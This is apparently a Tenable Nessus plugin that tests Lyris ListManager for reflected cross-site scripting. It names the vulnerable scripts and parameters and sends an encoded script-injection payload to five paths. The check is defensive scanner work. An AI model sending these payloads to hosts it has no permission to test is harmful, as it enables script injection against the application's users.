#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(41625);
  script_version("$Revision: 1.14 $");

  script_bugtraq_id(36509);
  script_osvdb_id(58463);

  script_name(english:"Lyris ListManager Multiple XSS");
  script_summary(english:"Attempts to exploit multiple XSS vulnerabilities");

  script_set_attribute( attribute:"synopsis", value:
"The remote web server is hosting an application that is affected by
multiple cross-site scripting vulnerabilities."  );

  script_set_attribute( attribute:"description", value:
"The remote host is running ListManager, a web-based commercial mailing
list management application from Lyris.

The installed version fails to properly sanitize user-supplied input
to multiple parameters / scripts before using it to generate dynamic
HTML output, such as :

  - /scripts/message/message.tml: 'how_many_back', 
    'msgdig_targeturl'

  - /read/attach_file.tml: 'page'

  - /read/attachment_too_large.tml: 'page'

  - /read/confirm_file_attach.tml: 'page'

  - /read/login/index.tml: 'emailaddr'

  - /read/login/sent_password.tml: 'emailaddr'

An attacker may be able to leverage these issues to launch cross-site
scripting attacks against users of the application.

Note that the installed version is likely to be affected by other
vulnerabilities, though Nessus has not tested for these."  );

   # http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr09-06
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?13503238"
  );

  script_set_attribute(
    attribute:"solution",
    value:"Unknown at this time."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(
    attribute:"vuln_publication_date",
    value:"2009/09/23"
  );
  script_set_attribute(
    attribute:"plugin_publication_date",
    value:"2009/09/25"
  );
 script_cvs_date("$Date: 2015/09/24 21:17:11 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:lyris:list_manager");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80, no_xss: 1);

banner = get_http_banner(port:port);
if (!banner) exit(1, "get_http_banner() returned NULL for port "+port+".");
if (
  banner &&
  (
    "Server: ListManagerWeb/" >!< banner &&
    "Server: Tcl-WebServer" >!< banner
  )
) exit(0, "The banner for port "+port+" is not from ListManager.");


exploit = string('">', "<script>alert('", SCRIPT_NAME, "')</script>");
url_exploit = urlencode(str:exploit);

paths = make_list(
  '/read/attach_file.tml?page=',
  '/read/attachment_too_large.tml?page=',
  '/read/confirm_file_attach.tml?page=',
  '/read/login/index.tml?emailaddr=',
  '/read/login/sent_password.tml?emailaddr='
);

exploit_pats = make_array();
exploit_pats['/read/attach_file.tml?page='] = string('<form action="', exploit, '.tml"');
exploit_pats['/read/attachment_too_large.tml?page='] = string('<form action="', exploit, '.tml" method=post>');
exploit_pats['/read/confirm_file_attach.tml?page='] = string('<form action="', exploit, '.tml" method=post>');
exploit_pats['/read/login/index.tml?emailaddr='] = string('name="emailaddr" value="', exploit, '" size=');
exploit_pats['/read/login/sent_password.tml?emailaddr='] = string(exploit, '</B></font></DIV>');

info = NULL;
n = 0;
foreach path (paths)
{
  url = string(path, url_exploit);

  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail: 1);

  if ('Lyris' >< res[2] &&
      'listmanager' >< res[2] &&
      exploit_pats[path] >< res[2]
  )
  {
    info = info + string("   - ", build_url(port:port, qs:url), "\n");
    n++;

    if (!thorough_tests) break;
  }
}

if ( strlen(info) > 0 )
{
  if (report_verbosity > 0)
  {
    if (n > 1) s = "Nessus was able to exploit these issues using the following URLs :\n";
    else s = "Nessus was able to exploit this issue using the following URL :\n:";

    report = string(
      "\n",
      s,
      "\n",
      info
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port:port);
  set_kb_item(name:'www/'+port+'XSS', value:TRUE);
  exit(0);
}
